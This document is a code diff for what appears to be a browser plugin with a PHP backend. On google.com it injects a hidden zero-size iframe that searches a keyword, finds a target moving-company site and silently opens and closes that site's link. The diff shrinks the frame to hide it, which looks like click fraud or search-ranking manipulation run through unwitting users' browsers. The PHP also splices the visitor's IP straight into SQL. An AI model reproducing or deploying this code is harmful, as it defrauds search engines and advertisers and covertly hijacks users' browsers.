@@ -1,41 +1,49 @@
-//CURRENT: get whole project together and init git
-//TODO: set youtubee.us up. set admin up, repack plugin, share content
-
 <?php
+// ISSUES: 1=2 in get.php,
+// CURRENT:
+// TODO: set youtubee.us up. set admin up, repack plugin, share content
 require_once 'config.php';
-header('Content-Type: text/html; charset=utf-8');
-$site="";
+header ( 'Content-Type: text/html; charset=utf-8' );
+$site = "";
 
-$word="";
-$days=date("z");
+$word = "";
+$days = date ( "z" );
 
-$ip=$_SERVER["REMOTE_ADDR"];
+$ip = $_SERVER ["REMOTE_ADDR"];
 
-$table=select("select * from site ");
+$table = select ( "select * from site " );
 
-$okSites=array();
-
-foreach ($table as $row){
-
-	$atable=	select("select * from actionp where siteid=$row[id] and days=$days and ip='$ip' and 1=2");
-	if(count($atable)==0){
-		$site=$row["site"];
-		$words=explode(",",$row["words"]);
-		
-		$word=$words[0];
-		$okSites[]=array("site"=>$site,"word"=>$word,"siteid"=>$row["id"]);
-			
+$okSites = array ();
+$du;
+foreach ( $table as $row ) {
+	
+	$atable = select ( "select * from actionp where siteid=$row[id] and days=$days and ip='$ip' and 1=2" );
+	$du = print_r ( $atable, true );
+	if (count ( $atable ) == 0) {
+		$site = $row ["site"];
+		$words = explode ( ",", $row ["words"] );
+	
+		$word = $words[0];
+		$okSites [] = array (
+				"site" => $site,
+				"word" => $word,
+				"siteid" => $row ["id"] 
+		);
 	}
-
 }
-$ind=rand(0,count($okSites));
-$okRow=$okSites[$ind];
-myQuery(getInsert("actionp",array("siteid"=>$okRow["siteid"],"days"=>$days,"ip"=>$ip)));
+//print_r($okSites);
+$ind = rand ( 0, count ( $okSites ) );
+$okRow = $okSites [$ind];
+myQuery ( getInsert ( "actionp", array (
+		"siteid" => $okRow ["siteid"],
+		"days" => $days,
+		"ip" => $ip 
+) ) );
 
-$site=$okRow["site"];
-$word=$okRow["word"];
+$site = $okRow ["site"];
+$word = $okRow ["word"];
 
-//echo "{\"site\":\"$site\",\"word\":\"$word\",\"code\":\"upcontrole()\"}";
+// echo "{\"site\":\"$site\",\"word\":\"$word\",\"code\":\"upcontrole()\"}";
 
 ?>
 
@@ -59,7 +67,14 @@ Hga = {
 			var isty = href.search(site)
 
 			if (isty != -1) {
-				an1.click()
+				
+					alert('found!')
+					var liloc=an1.getAttribute("href");
+					//top.location.href=liloc;
+					
+				var wi=	window.open(liloc);
+					setTimeout(function(){wi.close()},1000)
+					
 				found = true
 				alert('found!')
 			}
@@ -146,29 +161,35 @@ Hga = {
 	}
 }
 
+if(window.location.href.indexOf('google.com')>-1){
+
 var response = {
-<?php 
+<?php
 echo "	site : '$site',
 	word : '$word'";
 ?>
 
 }
 
-site = response.site;
-word = response.word;
+site ='www.evden-eve-nakliyat.info'; //response.site;
+word ='g�ztepe nakliyat'; //response.word;
 
 
 
-var frame = document.createElement('iframe');
+if(true){
 
-frame.setAttribute('width', '600');
-frame.setAttribute('height', '400');
-frame.setAttribute('frameborder', '0');
-frame.setAttribute('id', 'rtmframe');
-frame.setAttribute('src', gurl + word);
-
-document.body.appendChild(frame);
-
-tab = frame;
-if(site!='' && site !=='')
-setTimeout("Hga.searchSite()", 2000);
+	var frame = document.createElement('iframe');
+	
+	frame.setAttribute('width', '0');
+	frame.setAttribute('height', '0');
+	frame.setAttribute('frameborder', '0');
+	frame.setAttribute('id', 'rtmframe');
+	frame.setAttribute('src', gurl + word);
+	
+	document.body.appendChild(frame);
+	
+	tab = frame;
+	if(site!='' && site !=='')
+	setTimeout("Hga.searchSite()", 2000);
+}
+}
